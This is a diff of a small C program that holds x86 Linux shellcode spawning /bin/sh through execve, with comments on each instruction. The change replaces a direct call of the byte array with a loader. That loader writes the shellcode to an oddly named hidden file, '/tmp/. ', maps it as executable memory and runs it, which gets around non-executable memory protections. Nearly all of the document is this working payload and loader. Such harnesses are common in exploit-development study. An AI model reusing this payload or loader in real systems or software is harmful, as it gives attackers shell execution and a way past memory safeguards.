@@ -1,7 +1,14 @@
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/mman.h>
+
+#include <err.h>
+#include <fcntl.h>
 #include <stdio.h>
 #include <string.h>
+#include <unistd.h>
 
-char shell[] = "\x31\xc0" //xor eax,eax
+char shellcode[] = "\x31\xc0" //xor eax,eax
 			"\x50" //push eax
 			"\x68\x2f\x2f\x73\x68" //push 0x68732f2f
 			"\x68\x2f\x62\x69\x6e" //push 0x6e69622f
@@ -16,10 +23,24 @@ char shell[] = "\x31\xc0" //xor eax,eax
 			"\x31\xd2" //xor edx,edx
 			"\xcd\x80"; //int 0x80
 
-int main(){
-	void (*call)(void);
-	call = (void *)shell;
-	printf("Shell Code Length : %d\n", strlen(shell));
-	call();
+int main(int argc,char **argv){
+	void (*call)();
+	int fd;
+
+	printf("Shellcode : %d bytes\n", strlen(shellcode));
+	fd = open("/tmp/. ", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);
+    if (fd < 0)
+        perror("open");
+
+    write(fd, shellcode, strlen(shellcode));
+    if ((lseek(fd, 0L, SEEK_SET)) < 0)
+       	perror("lseek");
+
+    call = (void (*)())mmap(NULL, strlen(shellcode), PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0);
+   	if (call == (void (*)())MAP_FAILED)
+        perror("mmap");
+
+    call();
+
 	return 0;
 }
